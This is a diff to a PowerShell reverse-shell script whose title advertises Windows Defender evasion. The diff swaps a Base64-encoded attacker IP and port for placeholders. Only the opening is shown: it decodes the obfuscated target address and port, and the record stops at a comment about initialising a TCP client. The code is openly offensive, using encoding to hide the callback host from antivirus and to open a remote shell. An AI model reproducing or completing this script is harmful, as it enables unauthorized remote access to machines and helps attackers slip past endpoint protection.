@@ -1,12 +1,12 @@
 # Reverse Shell with Windows Defender Evasion Techniques
 # Encoded IP/Port + Stream Optimization + Error Resilience
 
-# Obfuscated target IP (Base64 encoded: '172.22.238.168' -> 'MTcyLjIyLjIzOC4xNjg=')
-$EncodedIP = [Convert]::FromBase64String('MTcyLjIyLjIzOC4xNjg=')
+# Obfuscated target IP (Base64 encoded: 'IP' -> 'Port')
+$EncodedIP = [Convert]::FromBase64String('Encoded Base64 IP Address')
 $TargetIP = [System.Text.Encoding]::ASCII.GetString($EncodedIP)
 
 # Obfuscated target port (Base64 encoded: '4445' -> 'NDQ0NQ==')
-$EncodedPort = [Convert]::FromBase64String('NDQ0NQ==')
+$EncodedPort = [Convert]::FromBase64String('Encoded Base64 PORT')
 $TargetPort = [int][System.Text.Encoding]::ASCII.GetString($EncodedPort)
 
 # Initialize TCP client with timeout
